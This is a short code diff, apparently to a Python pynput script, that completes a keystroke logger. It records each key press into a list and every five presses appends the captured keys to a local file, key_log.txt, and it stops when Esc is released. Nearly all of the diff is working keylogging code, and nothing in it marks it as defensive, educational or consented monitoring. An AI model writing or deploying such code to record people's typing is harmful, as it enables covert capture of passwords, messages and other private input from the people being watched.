@@ -7,12 +7,19 @@ keys = []
 
 def on_press(key):
     global keys, count
-    pass
+
+    keys.append(key)
+    count += 1
+
+    if count >= 5:
+        count = 0
+        write_file(keys)
+        keys = []
 
 def write_file(keys):
     with open("key_log.txt", "a") as f:
         for key in keys:
-            # Loop
+            f.write(str(key))
 
 def on_release(key):
     if key == Key.esc:
